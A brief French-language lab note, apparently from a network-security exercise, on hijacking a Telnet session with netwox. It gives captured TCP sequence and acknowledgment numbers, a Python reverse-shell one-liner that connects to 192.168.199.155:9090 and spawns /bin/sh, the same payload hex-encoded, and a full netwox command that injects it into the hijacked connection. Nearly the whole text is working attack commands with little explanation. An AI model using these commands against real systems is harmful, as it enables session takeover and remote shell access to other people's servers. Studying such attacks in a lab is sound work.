# Telnet Session hijacking with netwox

Source Port: 33186
Sequence Number (raw): 3920446218
Acknowledgment number (raw): 3464422836
## get shell code for reverse shell
On va executer un command linux sur serveur :
Encoder en hex ce code par utiliser python2 :
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.199.155",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);’<et un enter ici ‘0A’ en hex>
```
### On obtient:
```
"0a707974686f6e202d632027696d706f727420736f636b65742c73756270726f636573732c6f733b733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d293b732e636f6e6e6563742828223139322e3136382e3139392e313535222c3930393029293b6f732e6475703228732e66696c656e6f28292c30293b206f732e6475703228732e66696c656e6f28292c31293b206f732e6475703228732e66696c656e6f28292c32293b703d73756270726f636573732e63616c6c285b222f62696e2f7368222c222d69225d293b27"  <--- on va ajouter un 0a ici
```
### netwox command
```
$ sudo netwox 40 --ip4-src 192.168.199.159 --ip4-dst 192.168.199.156 --tcp-dst 22 --tcp-src 33186 --tcp-seqnum 3920446218 --tcp-acknum 3464422836 -A -z --tcp-window 2000 --tcp-data "0a707974686f6e202d632027696d706f727420736f636b65742c73756270726f636573732c6f733b733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d293b732e636f6e6e6563742828223139322e3136382e3139392e313535222c3930393029293b6f732e6475703228732e66696c656e6f28292c30293b206f732e6475703228732e66696c656e6f28292c31293b206f732e6475703228732e66696c656e6f28292c32293b703d73756270726f636573732e63616c6c285b222f62696e2f7368222c222d69225d293b270a"
```
